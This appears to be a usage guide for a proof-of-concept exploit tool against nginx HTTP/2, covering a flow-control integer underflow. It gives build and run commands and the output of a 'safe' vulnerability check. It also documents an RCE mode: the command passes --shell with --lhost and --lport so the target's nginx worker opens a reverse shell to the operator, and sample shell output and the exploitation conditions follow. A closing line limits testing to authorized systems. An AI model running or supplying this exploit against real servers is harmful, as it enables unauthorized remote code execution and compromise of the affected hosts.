# CVE-2026-123007 — proof of vulnerability

If you only need to **prove the vulnerability**, use this. No local nginx, no
listener, no reverse shell, no profile, and no 119 GiB are required.

```bash
cargo build --release
./target/release/poc --host https://TARGET/
# or: --proof (alias of --safe)
```

Successful output:

```
[+] CVE-2026-123007 PROOF: VULNERABLE
    target: https://TARGET/   resource: /index.html
    observed: server=Some("nginx/1.31.8") settings=[...] body=896 bytes
    [1] queued-DATA refund      : PASS (2 streams reset with FLOW_CONTROL_ERROR=3)
    [2] public-byte release    : PASS (10 bytes returned)
    [3] underflowed WU guard   : PASS (post-refund PING ACK)
    [4] connection still usable: PASS
    no memory corruption, no crash, no shell
```

What this means: the target refunded flow-control credit for DATA frames that
were still queued, driving the connection counter past the 31-bit maximum, and
then **accepted** a `WINDOW_UPDATE` that should have been rejected. That is the
CVE-2026-123007 integer underflow. No memory corruption is performed.

- Traffic: **~14 MiB**, a few seconds.
- Exit `0` = vulnerable, `4` = not proven.
- If the target has no HTTP/2: `target does not negotiate HTTP/2 (ALPN h2)`.
- If the body is outside 521–8192 bytes:
  `safe mode needs a response body of 521..8192 bytes` — use
  `--path /large-file`.

Multiple targets:

```bash
./target/release/poc --targets targets.txt --safe
./target/release/poc --hosts https://a/ --hosts https://b/
```

`README.md` contains the technical detail, the RCE modes (`--exploit` /
`--shell`), and the macOS build notes. For proving the vulnerability, this file
is all you need.

## Proving RCE

`--safe` does **not** prove RCE — it only proves the flow-control accounting
bug. RCE evidence is the output of a command executed **by the nginx worker on
the target**, not a "payload dispatched" status.

The only mode that proves it:

```bash
./target/release/poc --host https://TARGET/ --shell \
  --lhost YOUR_PUBLIC_IP --lport 4444 --yes
```

The tool opens the listener itself (do not run `nc`), sends ~119 GiB, and on
success prints:

```
[+] SHELL OK:
uid=101(nginx) gid=101(nginx) ...
nginx
Wed Nov 18 ... UTC 2026
Linux ... x86_64 GNU/Linux
```

The `uid=` line is the evidence of code execution. `--exploit` without a
listener is **not** enough: exit 0 only means the payload was dispatched
(`DISPATCHED (unconfirmed)`).

All of the following must hold (otherwise RCE cannot happen):

1. The target is the exact calibrated nginx **1.31.8 build** (Debian 13,
   glibc 2.41, x86-64), the target CPU has `avx512f` + `avx512vl`, the
   `/index.html` resource is 896 bytes, there are 4 workers, and the worker
   heap is still fresh. The only other embedded profile is 1.31.6. If you see
   `in-band HTTP/2 fingerprint matches no validated profile`, the target is not
   that build and cannot be proven with this binary without re-calibrating a
   profile.
2. `--safe` already reported `VULNERABLE` (necessary, not sufficient).
3. A direct path to the target: no CDN, proxy, or load balancer rewriting the
   HTTP/2 frames (a common cause of failure on the public internet).
4. `YOUR_PUBLIC_IP:4444` must be reachable from the target (public IP, port
   forwarding, or an open firewall). Otherwise the result is
   `DISPATCHED, NO SHELL`.
5. Time and bandwidth budget: ~119 GiB over 2–20 minutes, within nginx's
   one-hour connection lifetime.

Only test systems you own or have written authorization to test.
